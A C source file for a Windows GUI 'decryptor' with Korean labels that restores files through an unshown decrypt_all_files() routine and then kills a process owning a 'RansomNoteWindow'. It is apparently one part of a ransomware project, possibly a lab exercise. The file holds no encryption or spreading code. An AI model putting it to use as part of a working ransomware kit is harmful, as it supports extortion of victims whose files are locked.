// main_decryptor.c
#include <windows.h>
#include <stdio.h>
#include "decryptor.h"
#include "walker.h"

#define AES_KEY_SIZE 32
#define IV_SIZE 16
#define IDC_BTN_DECRYPT 1003

HINSTANCE hInst;

void do_decrypt(HWND hwnd) {
    int count = decrypt_all_files();
    if (count > 0) {
        MessageBoxA(hwnd, "복호화 완료!", "성공", MB_ICONINFORMATION);

        HWND ransomWnd = FindWindowA("RansomNoteWindow", NULL);
        if (ransomWnd) {
            DWORD pid = 0;
            GetWindowThreadProcessId(ransomWnd, &pid);
            if (pid != 0) {
                HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
                if (hProc) {
                    TerminateProcess(hProc, 0);
                    CloseHandle(hProc);
                }
            }
        }
    }
    else {
        MessageBoxA(hwnd, "복호화할 파일이 없습니다.", "실패", MB_ICONERROR);
    }
}

LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    switch (msg) {
    case WM_CREATE:
        CreateWindowA("static", "↓ 버튼을 눌러 복호화를 시작하세요", WS_VISIBLE | WS_CHILD,
            140, 30, 300, 20, hwnd, NULL, hInst, NULL);
        CreateWindowA("button", "복호화 시작", WS_VISIBLE | WS_CHILD,
            180, 70, 120, 30, hwnd, (HMENU)IDC_BTN_DECRYPT, hInst, NULL);
        break;

    case WM_COMMAND:
        if (LOWORD(wParam) == IDC_BTN_DECRYPT)
            do_decrypt(hwnd);
        break;

    case WM_DESTROY:
        PostQuitMessage(0);
        break;

    default:
        return DefWindowProc(hwnd, msg, wParam, lParam);
    }
    return 0;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
    LPSTR lpCmdLine, int nCmdShow) {
    hInst = hInstance;

    WNDCLASSA wc = { 0 };
    wc.lpfnWndProc = WndProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = "DecryptorWindow";
    RegisterClassA(&wc);

    HWND hwnd = CreateWindowA(
        "DecryptorWindow", "복호화 프로그램",
        WS_OVERLAPPEDWINDOW & ~(WS_MAXIMIZEBOX | WS_THICKFRAME),
        CW_USEDEFAULT, CW_USEDEFAULT, 480, 180,
        NULL, NULL, hInstance, NULL);

    if (!hwnd) return 0;

    ShowWindow(hwnd, nCmdShow);
    UpdateWindow(hwnd);

    MSG msg;
    while (GetMessageA(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessageA(&msg);
    }

    return (int)msg.wParam;
}
